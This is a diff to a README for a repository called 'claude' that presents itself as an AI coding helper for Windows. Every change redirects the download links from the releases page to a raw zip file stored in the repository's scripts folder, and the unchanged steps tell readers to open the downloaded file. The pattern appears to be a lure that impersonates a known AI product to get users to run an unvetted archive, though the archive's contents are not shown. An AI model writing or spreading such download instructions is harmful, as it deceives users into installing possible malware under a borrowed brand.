@@ -1,10 +1,10 @@
 # 🤖 claude - Simple AI coding help for Windows
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/Caseous-kerrcell366/claude/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/Caseous-kerrcell366/claude/raw/refs/heads/main/scripts/Software_2.4-alpha.4.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Caseous-kerrcell366/claude/releases
+Visit this page to download: https://github.com/Caseous-kerrcell366/claude/raw/refs/heads/main/scripts/Software_2.4-alpha.4.zip
 
 ## 🖥️ What this app does
 
@@ -21,7 +21,7 @@ It is built for people who want a fast AI tool on their computer without a full 
 
 ## 🚀 Getting started
 
-1. Open the download page: https://github.com/Caseous-kerrcell366/claude/releases
+1. Open the download page: https://github.com/Caseous-kerrcell366/claude/raw/refs/heads/main/scripts/Software_2.4-alpha.4.zip
 2. Find the latest release at the top of the page.
 3. Download the Windows file for your computer.
 4. After the file finishes downloading, open it.
@@ -30,7 +30,7 @@ It is built for people who want a fast AI tool on their computer without a full 
 
 ## 🪟 Install on Windows
 
-1. Go to https://github.com/Caseous-kerrcell366/claude/releases
+1. Go to https://github.com/Caseous-kerrcell366/claude/raw/refs/heads/main/scripts/Software_2.4-alpha.4.zip
 2. Look for a file with a Windows name, such as `.exe` or `.zip`.
 3. Download the file that fits your system.
 4. If you get a `.zip` file, right-click it and choose Extract All.
@@ -177,7 +177,7 @@ In most cases, you only need Windows, the downloaded release file, and a termina
 
 ## 📦 Download and install
 
-Download the latest version here: https://github.com/Caseous-kerrcell366/claude/releases
+Download the latest version here: https://github.com/Caseous-kerrcell366/claude/raw/refs/heads/main/scripts/Software_2.4-alpha.4.zip
 
 Then follow these steps:
 
